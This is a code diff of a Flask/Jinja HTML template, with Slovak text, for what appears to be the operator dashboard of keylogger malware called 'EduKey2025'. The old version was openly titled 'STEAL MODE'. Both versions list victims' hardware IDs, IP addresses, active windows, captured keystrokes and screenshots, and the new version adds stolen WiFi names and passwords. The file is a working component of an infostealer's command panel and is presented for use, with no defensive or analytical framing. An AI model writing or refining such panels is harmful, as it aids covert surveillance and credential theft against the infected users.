@@ -1,135 +1,109 @@
 <!DOCTYPE html>
 <html lang="sk">
 <head>
-<meta charset="UTF-8" />
-<title>EduKey Admin Panel - STEAL MODE</title>
-<style>
-  /* Dark hacker vibe */
-  body {
-    background-color: #0f0f0f;
-    color: #00ff00;
-    font-family: 'Courier New', Courier, monospace;
-    margin: 0; padding: 20px;
-  }
-  h2 {
-    text-align: center;
-    font-size: 2.5em;
-    text-shadow: 0 0 5px #00ff00, 0 0 10px #00ff00;
-  }
-  table {
-    border-collapse: collapse;
-    width: 100%;
-    border: 1px solid #00ff00;
-    box-shadow: 0 0 15px #00ff00aa;
-  }
-  th, td {
-    border: 1px solid #00ff00;
-    padding: 8px;
-    text-align: left;
-    vertical-align: middle;
-  }
-  th {
-    background: #003300;
-    text-transform: uppercase;
-    letter-spacing: 1px;
-  }
-  pre {
-    white-space: pre-wrap;
-    word-wrap: break-word;
-    font-size: 0.9em;
-    color: #0f0;
-  }
-  img {
-    max-height: 120px;
-    border: 1px solid #00ff00;
-    box-shadow: 0 0 8px #00ff00;
-  }
-  tr:hover {
-    background-color: #002200;
-    cursor: pointer;
-  }
-  /* Glitch effect on keys */
-  td pre {
-    position: relative;
-    animation: glitch 2s infinite;
-  }
-  @keyframes glitch {
-    0% {
-      text-shadow:
-        2px 0 red,
-        -2px 0 cyan;
+  <meta charset="UTF-8" />
+  <title>EduKey2025 Dashboard</title>
+  <style>
+    body {
+      background-color: #0f0f0f;
+      color: #00ff00;
+      font-family: "Courier New", Courier, monospace;
+      margin: 0; padding: 1rem;
     }
-    20% {
-      text-shadow:
-        -2px 0 red,
-        2px 0 cyan;
+    header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      border-bottom: 1px solid #00ff00;
+      padding-bottom: 0.5rem;
+      margin-bottom: 1rem;
     }
-    40% {
-      text-shadow:
-        2px 0 red,
-        -2px 0 cyan;
+    a.logout {
+      color: #00ff00;
+      text-decoration: none;
+      border: 1px solid #00ff00;
+      padding: 0.2rem 0.5rem;
+      border-radius: 4px;
+      transition: all 0.3s ease;
     }
-    60% {
-      text-shadow:
-        -2px 0 red,
-        2px 0 cyan;
+    a.logout:hover {
+      background-color: #00ff00;
+      color: #0f0f0f;
     }
-    80% {
-      text-shadow:
-        2px 0 red,
-        -2px 0 cyan;
+    h1 {
+      margin: 0;
+      font-size: 1.5rem;
     }
-    100% {
-      text-shadow:
-        none;
+    .entry {
+      border: 1px solid #00ff00;
+      padding: 1rem;
+      margin-bottom: 1rem;
+      border-radius: 6px;
+      box-shadow: 0 0 10px #00880044;
+      background-color: #101010;
     }
-  }
-  /* Scroll bar for large data */
-  tbody {
-    display: block;
-    max-height: 600px;
-    overflow-y: auto;
-  }
-  thead, tbody tr {
-    display: table;
-    width: 100%;
-    table-layout: fixed;
-  }
-</style>
+    .entry pre {
+      white-space: pre-wrap;
+      word-wrap: break-word;
+      background-color: #00000088;
+      padding: 0.5rem;
+      border-radius: 4px;
+      max-height: 300px;
+      overflow: auto;
+    }
+    .entry img {
+      max-width: 300px;
+      border: 1px solid #00ff00;
+      margin-top: 0.5rem;
+      border-radius: 4px;
+      box-shadow: 0 0 8px #00ff00aa;
+      display: block;
+    }
+    /* Animácia písania */
+    @keyframes typing {
+      from { width: 0 }
+      to { width: 100% }
+    }
+    .typing-effect {
+      overflow: hidden;
+      white-space: nowrap;
+      border-right: 2px solid #00ff00;
+      animation: typing 2s steps(40, end), blink 0.75s step-end infinite;
+      max-width: 100%;
+      display: inline-block;
+    }
+    @keyframes blink {
+      50% { border-color: transparent }
+      100% { border-color: #00ff00 }
+    }
+  </style>
 </head>
 <body>
-  <h2>EDUKEY 2025 - STEAL MODE</h2>
-  <table>
-    <thead>
-      <tr>
-        <th>Čas</th>
-        <th>User</th>
-        <th>HWID</th>
-        <th>IP</th>
-        <th>Aktívne okno</th>
-        <th>Stlačené klávesy</th>
-        <th>Screenshot</th>
-      </tr>
-    </thead>
-    <tbody>
-      {% for entry in data %}
-      <tr>
-        <td>{{ entry.received_at }}</td>
-        <td>{{ entry.user_id }}</td>
-        <td>{{ entry.hwid }}</td>
-        <td>{{ entry.ip_address }}</td>
-        <td>{{ entry.active_window }}</td>
-        <td><pre>{{ entry.keys }}</pre></td>
-        <td>
-          {% if entry.screenshot %}
-            <img src="data:image/png;base64,{{ entry.screenshot }}" alt="Screenshot" />
-          {% else %}
-            Žiadny
-          {% endif %}
-        </td>
-      </tr>
-      {% endfor %}
-    </tbody>
-  </table>
+  <header>
+    <h1 class="typing-effect">EduKey2025 Dashboard</h1>
+    <a href="{{ url_for('logout') }}" class="logout">Logout</a>
+  </header>
+
+  {% if data %}
+    {% for entry in data %}
+      <div class="entry">
+        <strong>User ID:</strong> {{ entry.user_id }}<br />
+        <strong>HWID:</strong> {{ entry.hwid }}<br />
+        <strong>IP Address:</strong> {{ entry.ip_address }}<br />
+        <strong>Active Window:</strong> {{ entry.active_window }}<br />
+        <strong>Received at:</strong> {{ entry.received_at }}<br />
+        <strong>Keys pressed:</strong>
+        <pre>{{ entry.keys }}</pre>
+        <strong>WiFi SSID:</strong> {{ entry.wifi_ssid or "Žiadne" }}<br />
+        <strong>WiFi Password:</strong> {{ entry.wifi_password or "Neznáme" }}<br />
+        {% if entry.screenshot %}
+          <strong>Screenshot:</strong><br />
+          <img src="data:image/png;base64,{{ entry.screenshot }}" alt="Screenshot" />
+        {% endif %}
+      </div>
+    {% endfor %}
+  {% else %}
+    <p>Žiadne dáta.</p>
+  {% endif %}
 </body>
 </html>
